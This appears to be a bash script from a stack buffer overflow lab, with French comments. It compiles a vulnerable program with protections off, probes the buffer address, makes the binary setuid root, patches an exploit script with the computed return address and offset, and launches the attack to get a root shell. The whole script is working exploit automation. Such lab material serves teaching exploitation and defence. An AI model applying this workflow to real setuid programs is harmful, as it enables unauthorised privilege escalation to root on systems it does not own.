#!/bin/bash
# T3 Niveau 3 - exactement la methode qui a fonctionne ce soir : sonde
# reelle (jamais gdb), offset fixe=216 (verifie plusieurs fois par
# formule (rbp-buffer)+8), ret = &buffer + 75 (sled large, start=150).
source "$(dirname "$0")/00_config.sh" || exit 1
sudo ln -sf /bin/zsh /bin/sh
cd "$E3" || exit 1

echo "=== Mesure reelle de &buffer (sonde temporaire, stack-L3) ==="
cp stack.c stack_probe_tmp.c
sed -i '/char buffer\[BUF_SIZE\];/a\    printf("PROBE &buffer = %p\\n", (void*)buffer); fflush(stdout);' stack_probe_tmp.c
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack_probe_tmp.c
touch badfile
PROBE_OUT=$(timeout 2 ./stack-L3 2>&1)
BUF_HEX=$(echo "$PROBE_OUT" | grep -oE '0x[0-9a-fA-F]+' | tail -1)
rm -f stack_probe_tmp.c
echo "&buffer mesure = $BUF_HEX"

if [ -z "$BUF_HEX" ]; then
  echo "ERREUR : sonde n'a rien mesure."
  exit 1
fi

RET_HEX=$(python3 -c "print(hex($BUF_HEX + 75))")
echo "ret calcule = $RET_HEX (offset=216, start=150)"

echo "=== Reconstruction du binaire PROPRE + setuid root ==="
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
sudo chown root stack-L3
sudo chmod 4755 stack-L3

echo "=== Mise a jour d'exploit_L3.py avec ret/offset/start ==="
sed -i -E "s/^ret[[:space:]]*=.*/ret = $RET_HEX/" exploit_L3.py
sed -i -E "s/^offset[[:space:]]*=.*/offset = 216/" exploit_L3.py
sed -i -E "s/^start[[:space:]]*=.*/start = 150/" exploit_L3.py
grep -nE "^(ret|offset|start)" exploit_L3.py

echo "=== Generation du badfile + attaque ==="
python3 exploit_L3.py
./stack-L3
id
cat /proc/self/status | grep -E "^Uid|^Gid"
exit
